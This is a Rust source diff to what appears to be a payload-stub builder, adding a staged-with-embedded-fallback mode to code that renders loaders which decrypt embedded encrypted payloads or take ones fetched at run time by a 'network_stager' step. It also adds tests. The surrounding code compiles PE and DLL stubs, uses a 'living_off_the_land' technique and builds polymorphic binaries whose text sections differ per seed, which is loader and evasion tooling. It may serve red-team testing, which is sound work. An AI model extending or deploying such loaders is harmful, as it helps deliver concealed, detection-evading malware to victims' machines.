@@ -72,6 +72,19 @@ fn decrypt_step(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Resul
 }
 "#;
 
+/// How an Execution step obtains its payload bytes.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PayloadSource {
+    /// The ciphertext embedded in the artifact (`include_bytes!`).
+    Embedded,
+    /// The staged slot only (`network_stager` `fallback: none`): the artifact
+    /// carries no copy of the payload.
+    Staged,
+    /// The staged slot when the fetch succeeded, the embedded ciphertext
+    /// otherwise (`network_stager` `fallback: embedded`).
+    StagedWithFallback,
+}
+
 /// One payload handed to the renderer, already encrypted.
 #[derive(Debug, Clone)]
 pub struct PayloadCipher {
@@ -95,10 +108,11 @@ pub struct PayloadCipher {
     /// a debug artifact (`build.stub.debug`); ignored, and never embedded,
     /// otherwise.
     pub marker: String,
-    /// Whether the payload is staged (fetched at run time by a `network_stager`
-    /// step) rather than embedded. When true, `path`/`nonce`/`key`/`plaintext_len`
-    /// are unused.
-    pub staged: bool,
+    /// Where the payload comes from. For [`PayloadSource::Staged`],
+    /// `path`/`nonce`/`key`/`plaintext_len` are unused; for
+    /// [`PayloadSource::StagedWithFallback`] they describe the embedded copy the
+    /// runner uses when the fetch did not stage one.
+    pub source: PayloadSource,
 }
 
 /// One resolved step handed to the renderer.
@@ -535,10 +549,11 @@ fn render_execution_block(
         "false"
     };
 
-    if payload.staged {
-        // A staged payload is fetched at run time by a preceding `network_stager`
-        // step and read from the shared slot, so there is no embedded ciphertext.
-        return format!(
+    match payload.source {
+        // A staged payload is fetched at run time by a preceding
+        // `network_stager` step and read from the shared slot, so there is no
+        // embedded ciphertext.
+        PayloadSource::Staged => format!(
             "    {{\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
              \x20       let mut image = crate::take_staged_payload()?;\n\
@@ -554,31 +569,59 @@ fn render_execution_block(
             overridden = overridden,
             marker_line = marker_line,
             index = index,
-        );
+        ),
+        // `network_stager` with `fallback: embedded`: the fetched copy wins
+        // when the fetch staged one, the embedded ciphertext otherwise.
+        PayloadSource::StagedWithFallback => format!(
+            "    {{\n\
+             \x20       crate::set_stage_args({args}, {overridden});\n\
+             \x20       let mut image = match crate::take_staged_payload() {{\n\
+             \x20           Ok(bytes) => bytes,\n\
+             \x20           Err(_) => {{\n\
+             \x20               let enc: &[u8] = include_bytes!(\"{path}\");\n\
+             \x20               decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?\n\
+             \x20           }}\n\
+             \x20       }};\n\
+             {marker_line}\
+             \x20       match step_{index}::payload(&mut image) {{\n\
+             \x20           Ok(code) => {{\n\
+             \x20               last = code;{success}\n\
+             \x20           }}\n\
+             \x20           Err(e) => {{{failure}}}\n\
+             \x20       }}\n\
+             \x20   }}\n",
+            args = args,
+            overridden = overridden,
+            path = payload.path,
+            nonce = hex::encode(payload.nonce),
+            key = hex::encode(payload.key),
+            len = payload.plaintext_len,
+            marker_line = marker_line,
+            index = index,
+        ),
+        PayloadSource::Embedded => format!(
+            "    {{\n\
+             \x20       crate::set_stage_args({args}, {overridden});\n\
+             \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
+             \x20       let mut image = decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?;\n\
+             {marker_line}\
+             \x20       match step_{index}::payload(&mut image) {{\n\
+             \x20           Ok(code) => {{\n\
+             \x20               last = code;{success}\n\
+             \x20           }}\n\
+             \x20           Err(e) => {{{failure}}}\n\
+             \x20       }}\n\
+             \x20   }}\n",
+            args = args,
+            overridden = overridden,
+            path = payload.path,
+            nonce = hex::encode(payload.nonce),
+            key = hex::encode(payload.key),
+            len = payload.plaintext_len,
+            marker_line = marker_line,
+            index = index,
+        ),
     }
-
-    format!(
-        "    {{\n\
-         \x20       crate::set_stage_args({args}, {overridden});\n\
-         \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
-         \x20       let mut image = decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?;\n\
-         {marker_line}\
-         \x20       match step_{index}::payload(&mut image) {{\n\
-         \x20           Ok(code) => {{\n\
-         \x20               last = code;{success}\n\
-         \x20           }}\n\
-         \x20           Err(e) => {{{failure}}}\n\
-         \x20       }}\n\
-         \x20   }}\n",
-        args = args,
-        overridden = overridden,
-        path = payload.path,
-        nonce = hex::encode(payload.nonce),
-        key = hex::encode(payload.key),
-        len = payload.plaintext_len,
-        marker_line = marker_line,
-        index = index,
-    )
 }
 
 /// One inline sleep.
@@ -626,6 +669,7 @@ fn failure_action(failure: StepFailure) -> &'static str {
 /// Lets the ignored compile tests (which think in terms of a technique runtime)
 /// drive the step renderer without re-deriving the cipher plumbing.
 #[cfg(test)]
+#[cfg(feature = "live-tests")]
 pub(crate) fn test_params(
     runtime: &[RuntimeStep],
     encrypted: &crate::engine::crypto::EncryptedPayload,
@@ -648,7 +692,7 @@ pub(crate) fn test_params(
                 args: Vec::new(),
                 args_override: false,
                 marker: stub::generate_stub_marker(),
-                staged: false,
+                source: PayloadSource::Embedded,
             });
             StepPayload {
                 index,
@@ -673,7 +717,9 @@ pub(crate) fn test_params(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::plan::schema::{Arch, StepFailure, StepOutcome};
+    #[cfg(feature = "live-tests")]
+    use crate::plan::schema::Arch;
+    use crate::plan::schema::{StepFailure, StepOutcome};
     use crate::techniques::living_off_the_land;
     use crate::techniques::sleep;
 
@@ -692,7 +738,7 @@ mod tests {
             args: Vec::new(),
             args_override: false,
             marker: marker.to_string(),
-            staged: false,
+            source: PayloadSource::Embedded,
         }
     }
 
@@ -889,6 +935,44 @@ mod tests {
     }
 
     #[test]
+    fn a_staged_payload_has_no_embedded_ciphertext() {
+        let mut step = execution_step(0);
+        if let Some(payload) = step.payload.as_mut() {
+            payload.source = PayloadSource::Staged;
+        }
+        let out = render(vec![step]);
+        assert!(
+            out.contains("crate::take_staged_payload()?"),
+            "the staged slot is not read"
+        );
+        assert!(
+            !out.contains("include_bytes!"),
+            "a strictly staged payload must not embed ciphertext"
+        );
+    }
+
+    #[test]
+    fn a_staged_payload_with_a_fallback_embeds_the_copy_it_falls_back_to() {
+        let mut step = execution_step(0);
+        if let Some(payload) = step.payload.as_mut() {
+            payload.source = PayloadSource::StagedWithFallback;
+        }
+        let out = render(vec![step]);
+        assert!(
+            out.contains("crate::take_staged_payload()"),
+            "the staged slot is not read"
+        );
+        assert!(
+            out.contains("include_bytes!(\"payload_0.bin\")"),
+            "the embedded fallback is missing"
+        );
+        assert!(
+            out.contains("decrypt_step(enc"),
+            "the fallback is not decrypted"
+        );
+    }
+
+    #[test]
     fn an_exe_build_renders_the_plain_entry() {
         let out = render(vec![execution_step(0)]);
         assert!(
@@ -1036,8 +1120,9 @@ mod tests {
 
     /// Compiles a preparation + execution + control stub to a PE. The real
     /// end-to-end check of the step renderer; marked `#[ignore]` because it
-    /// needs `rustc` and the compiled dependencies (`cargo test -- --ignored`).
+    /// needs `rustc` and the compiled dependencies (`cargo test --features live-tests -- --ignored`).
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn a_step_stub_compiles_to_a_pe() {
         use crate::engine::compiler;
@@ -1084,6 +1169,7 @@ mod tests {
     /// that exports the entry points. The end-to-end check of the DLL output;
     /// marked `#[ignore]` for the same reasons as the executable one.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn a_dll_stub_compiles_to_a_library_with_exports() {
         use crate::engine::compiler::{self, CompileOptions};
@@ -1146,6 +1232,7 @@ mod tests {
     /// the other compile tests; the measured numbers live in
     /// `docs/design/polymorphism.md`.
     #[test]
+    #[cfg(feature = "live-tests")]
     #[ignore = "requires rustc and the compiled dependencies"]
     fn two_polymorphism_seeds_differ_in_the_text_section() {
         use crate::engine::compiler;
